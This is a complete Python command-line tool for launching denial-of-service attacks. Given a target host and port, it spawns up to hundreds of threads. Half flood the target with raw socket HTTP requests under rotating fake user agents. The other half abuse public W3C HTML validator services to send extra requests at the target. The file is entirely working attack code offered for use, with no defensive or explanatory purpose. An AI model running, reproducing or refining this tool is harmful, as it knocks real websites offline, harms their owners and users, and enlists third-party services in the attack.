#!/usr/bin/python3
# -*- coding: utf-8 -*-

import sys
import time
import socket
import threading
import logging
import urllib.request
import random
import argparse
import signal
import os
from datetime import datetime

# Terminal colors
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ENDC = '\033[0m'

# Banner
def print_banner():
    banner = f"""
{Colors.CYAN}
███╗   ███╗ █████╗ ██╗     
████╗ ████║██╔══██╗██║     
██╔████╔██║███████║██║     
██║╚██╔╝██║██╔══██║██║     
██║ ╚═╝ ██║██║  ██║███████╗
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝
{Colors.ENDC}
{Colors.MAGENTA}                    © Daniel-191{Colors.ENDC}
"""
    print(banner)

# User agents for requests
def user_agent():
    uagent = [
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
        "Mozilla/5.0 (Linux; rv:81.0) Gecko/20100101 Firefox/81.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:81.0) Gecko/20100101 Firefox/81.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0",
        "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    ]
    return uagent

# Validator URLs for additional pressure
def validators():
    vals = [
        "https://validator.w3.org/nu/?doc=http://",
        "https://validator.w3.org/checklink?uri=http://",
        "https://html5.validator.nu/?doc=http://"
    ]
    return vals

# Bot rippering function
def bot_rippering(url, uagent_list):
    try:
        while True:
            req = urllib.request.urlopen(
                urllib.request.Request(
                    url,
                    headers={'User-Agent': random.choice(uagent_list)}
                )
            )
            logging.info(f"{Colors.MAGENTA}bot is rippering...{Colors.ENDC}")
            time.sleep(random.uniform(0.1, 0.5))
    except Exception as e:
        logging.error(f"{Colors.RED}Bot rippering error: {e}{Colors.ENDC}")
        time.sleep(0.1)

# Direct socket connection DDOS
def down_it(host, port, uagent_list, data):
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent_list) + "\n" + data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                logging.info(f"{Colors.GREEN}{timestamp}{Colors.ENDC} {Colors.GREEN} <--packet sent! rippering--> {Colors.ENDC}")
            else:
                s.shutdown(1)
                logging.error(f"{Colors.RED}shut<->down{Colors.ENDC}")
            time.sleep(random.uniform(0.1, 0.5))
    except socket.error as e:
        logging.error(f"{Colors.RED}no connection! web server maybe down! {e}{Colors.ENDC}")
        time.sleep(0.1)
    except Exception as e:
        logging.error(f"{Colors.RED}Unexpected error in down_it: {e}{Colors.ENDC}")
        time.sleep(0.1)

# Threaded DDOS function
def dos_thread(host, port, uagent_list, data, thread_id):
    try:
        while True:
            down_it(host, port, uagent_list, data)
    except Exception as e:
        logging.error(f"{Colors.RED}Thread {thread_id} error: {e}{Colors.ENDC}")

# Threaded validator function
def validator_thread(url, uagent_list, thread_id):
    try:
        while True:
            bot_rippering(url, uagent_list)
    except Exception as e:
        logging.error(f"{Colors.RED}Validator thread {thread_id} error: {e}{Colors.ENDC}")

# Graceful shutdown
def signal_handler(sig, frame):
    print(f'\n{Colors.YELLOW}Received SIGINT, shutting down gracefully...{Colors.ENDC}')
    sys.exit(0)

# Main function
def main():
    print_banner()

    # Parse arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('target', help='Target IP or domain')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads (default: 100)')
    parser.add_argument('-d', '--delay', type=float, default=0.1, help='Delay between requests (default: 0.1)')
    parser.add_argument('--log', help='Log file path')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')

    args = parser.parse_args()

    # Setup logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    if args.log:
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(args.log),
                logging.StreamHandler(sys.stdout)
            ]
        )
    else:
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )

    # Register signal handler
    signal.signal(signal.SIGINT, signal_handler)

    # Get target info
    target = args.target
    port = args.port
    num_threads = args.threads

    # Initialize components
    uagent_list = user_agent()
    validator_list = validators()

    # Load data from file if available
    try:
        with open('data.txt', 'r') as f:
            data = f.read()
    except FileNotFoundError:
        data = "User-Agent: " + random.choice(uagent_list) + "\r\n"

    logging.info(f"{Colors.BLUE}Starting attack on {target}:{port} with {num_threads} threads{Colors.ENDC}")

    # Create threads
    threads = []

    # Create socket threads
    for i in range(num_threads // 2):
        t = threading.Thread(target=dos_thread, args=(target, port, uagent_list, data, i))
        t.daemon = True
        t.start()
        threads.append(t)

    # Create validator threads
    for i in range(num_threads // 2):
        validator_url = random.choice(validator_list) + target
        t = threading.Thread(target=validator_thread, args=(validator_url, uagent_list, i))
        t.daemon = True
        t.start()
        threads.append(t)

    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f'\n{Colors.YELLOW}Shutting down...{Colors.ENDC}')
        sys.exit(0)

if __name__ == "__main__":
    main()